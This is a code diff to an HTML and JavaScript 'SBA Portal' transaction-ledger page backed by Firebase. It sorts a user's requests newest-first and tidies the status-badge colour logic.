@@ -7,7 +7,7 @@
     <title>SBA Portal | Transaction Ledger</title>
     <style>
         :root { --sba-blue: #00274c; --sba-accent: #0071bc; }
-        body { background: #f1f5f9; margin: 0; font-family: 'Segoe UI', sans-serif; }
+        body { background: #f1f5f9; margin: 0; font-family: 'Segoe UI', sans-serif; -webkit-tap-highlight-color: transparent; }
         
         .gov-banner { background: #f1f1f1; color: #333; font-size: 10px; padding: 6px 15px; display: flex; align-items: center; font-weight: 700; border-bottom: 1px solid #ddd; }
         .nav-header { background: var(--sba-blue); padding: 12px 20px; display: flex; justify-content: space-between; align-items: center; }
@@ -84,23 +84,33 @@
 
             const list = document.getElementById('transactionList');
 
-            // 1. MASTER LISTENER (User Data for main Allocation)
             onSnapshot(doc(db, "users", user.uid), (userSnap) => {
                 if (!userSnap.exists()) return;
                 const userData = userSnap.data();
                 
-                // Robust balance cleaning
                 let rawBal = userData.balance || 0;
                 if(typeof rawBal === 'string') rawBal = rawBal.replace(/[$,]/g, '');
                 const bal = parseFloat(rawBal).toLocaleString('en-US', {minimumFractionDigits: 2});
 
-                // 2. REQUESTS LISTENER (Transfers, KYC, etc)
                 const q = query(collection(db, "requests"), where("userId", "==", user.uid));
                 
                 onSnapshot(q, (snapshot) => {
                     list.innerHTML = ""; // Clear loader
 
-                    // Add the Main Allocation Row First
+                    // Collect all requests into an array
+                    const requests = [];
+                    snapshot.forEach((doc) => {
+                        requests.push({ id: doc.id, ...doc.data() });
+                    });
+
+                    // SORT: Newest Timestamp first
+                    requests.sort((a, b) => {
+                        const timeA = a.timestamp?.seconds || 0;
+                        const timeB = b.timestamp?.seconds || 0;
+                        return timeB - timeA;
+                    });
+
+                    // 1. Add the Main Allocation Row First (Always at very top)
                     list.innerHTML += `
                         <div class="t-row">
                             <div class="t-info">
@@ -114,15 +124,12 @@
                         </div>
                     `;
 
-                    // Add other activities
-                    snapshot.forEach((doc) => {
-                        const t = doc.data();
+                    // 2. Add the sorted activities
+                    requests.forEach((t) => {
                         const status = (t.status || 'PROCESSING').toUpperCase();
-                        
-                        // Handle Colors
                         let badgeClass = "bg-pending";
-                        if (status === "SUCCESSFUL" || status === "APPROVED" || status === "COMPLETED") badgeClass = "bg-success";
-                        if (status === "DENIED" || status === "FAILED") badgeClass = "bg-denied";
+                        if (["SUCCESSFUL", "APPROVED", "COMPLETED"].includes(status)) badgeClass = "bg-success";
+                        if (["DENIED", "FAILED", "REJECTED"].includes(status)) badgeClass = "bg-denied";
 
                         const isNeg = t.type === "WITHDRAWAL" || t.type === "TRANSFER";
                         
